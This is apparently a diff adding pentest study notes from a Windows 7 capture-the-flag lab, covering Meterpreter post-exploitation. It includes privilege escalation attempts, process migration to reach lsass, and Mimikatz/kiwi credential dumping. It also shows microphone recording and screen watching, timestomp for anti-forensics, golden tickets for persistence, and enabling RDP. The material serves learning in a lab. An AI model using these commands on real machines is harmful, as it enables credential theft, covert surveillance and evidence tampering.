@@ -145,3 +145,96 @@ Steps
   - toogle dynamic resolution update
   - whoami : nt authority\system
 - check browser history / credentials
+- nmap -sC
+  - OS
+  - Computer name / hostname
+  - ...
+- https://www.cvedetails.com/
+
+![img.png](_images/img.png)
+
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: 691 The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
+[-] Named Pipe Impersonation (PrintSpooler variant)
+[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
+
+sysinfo
+Computer        : XXX-PC
+OS              : Windows **7** (6.1 **Build 7601**, Service Pack 1).
+Architecture    : **x64** (used to determine what scripts you can use)
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+getuid
+Server username: XXX-PC\Dark
+
+hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+
+While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`
+
+* sessions id (same as sessions -i id in the msf shell)
+* see your priviledges: getprivs
+
+Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. 
+
+The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service? spoolsv.exe
+
+In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass.
+
+* `migrate -N process_name`
+
+Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz, enter help once loaded)
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+creds_all
+
+* wdigest credentials
+* tspkg credentials
+* kerberos credential
+
+Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'.
+
+screenshare    Watch the remote user desktop in real time
+screenshot     Grab a screenshot of the interactive desktop
+record_mic     Record audio from the default microphone for X seconds
+
+To complicate forensics efforts we can modify timestamps of files on the system.
+
+timestomp
+
+Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
+
+Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
+
+it's always interesting to remote into machines and view them as their users do.
+
+remote desktop (MSRDP)
+we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`
